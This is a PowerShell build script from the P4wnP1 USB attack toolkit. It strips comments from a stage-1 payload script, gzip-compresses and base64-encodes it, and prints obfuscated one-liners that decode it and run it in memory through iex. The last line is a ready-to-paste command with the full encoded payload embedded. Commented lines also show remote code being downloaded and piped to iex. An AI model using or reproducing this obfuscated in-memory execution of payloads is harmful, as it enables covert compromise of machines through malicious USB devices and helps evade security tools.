
#    This file is part of P4wnP1.
#
#    Copyright (c) 2017, Marcus Mengs. 
#
#    P4wnP1 is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    P4wnP1 is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with P4wnP1.  If not, see <http://www.gnu.org/licenses/>.


$infile = "stage1_no_pid_vid.ps1"
$RemoveComments = $true
$script=$null

if ($RemoveComments)
{
    # PS 3.0 needed
    #Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/ScriptModification/Remove-Comments.ps1 | iex
    # PS 2.0 way
    #(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/ScriptModification/Remove-Comments.ps1') | iex
    Get-Content Remove-Comments.ps1 | Out-String | iex
    $script = (Remove-Comments $infile).ToString()
    
    $len = (Get-Content $infile | Out-String).Length
    "Raw script length $len"    
}
else
{
    #convert readen multiline array to single string with Out-String
    $script=Get-Content $infile | Out-String
}


$len = $script.Length
"Script length with comments stripped $len"

# $script to byte[]
$scriptbytes = [System.Text.Encoding]::ASCII.GetBytes($script)



# compress 
#$zipos = [System.IO.MemoryStream]::new() # no public constructor on old NET framework ??
$zipos = New-Object System.IO.MemoryStream
#$zipstream = [System.IO.Compression.GZipStream]::new($zipos, [System.IO.Compression.CompressionMode]::Compress)
$zipstream = New-Object System.IO.Compression.GZipStream -ArgumentList ($zipos, [System.IO.Compression.CompressionMode]::Compress)
$zipstream.Write($scriptbytes, 0, $scriptbytes.Length)
$zipstream.Close()

# Readback zipped data
$zippedbytes = $zipos.ToArray()

$lenzipped = $zippedbytes.Length
"Script length zipped $lenzipped"


# convert to base64
$scriptb64 = [System.Convert]::ToBase64String($zippedbytes)
$lenb64 = $scriptb64.Length
"Zipped script length base64 $lenb64"
#$scriptb64

$scriptb64 | Out-File base64.ps1

# decompress
#$ms = [System.IO.MemoryStream]::new([System.Convert]::FromBase64String($scriptb64))
$ms = New-Object System.IO.MemoryStream -ArgumentList @(,[System.Convert]::FromBase64String($scriptb64))
$decompressed = (New-Object System.IO.StreamReader(New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()
$lendec = $decompressed.Length
"Script length decompresses $lendec"
#$decompressed

# long invoke of base64 gzip string
$b="$scriptb64"; (New-Object System.IO.StreamReader(New-Object System.IO.Compression.GZipStream((New-Object System.IO.MemoryStream -ArgumentList @(,[System.Convert]::FromBase64String($b))), [System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd() | iex

# shortened invoke (create alias for new-object "no", force to overwrite existing alias)
$b="$scriptb64";nal no New-Object -F;(no IO.StreamReader(no IO.Compression.GZipStream((no IO.MemoryStream -ArgumentList @(,[Convert]::FromBase64String($b))), [IO.Compression.CompressionMode]::Decompress))).ReadToEnd()|iex
$b="$scriptb64";nal no New-Object -F;iex (no IO.StreamReader(no IO.Compression.GZipStream((no IO.MemoryStream -ArgumentList @(,[Convert]::FromBase64String($b))), [IO.Compression.CompressionMode]::Decompress))).ReadToEnd()

# the base 64 string has to be ins single quotes for command line usage; USB_VID are packed to output
$USB_VID="1D6B";$USB_PID="0137";$b='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';nal no New-Object -F;iex (no IO.StreamReader(no IO.Compression.GZipStream((no IO.MemoryStream -A @(,[Convert]::FromBase64String($b))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()





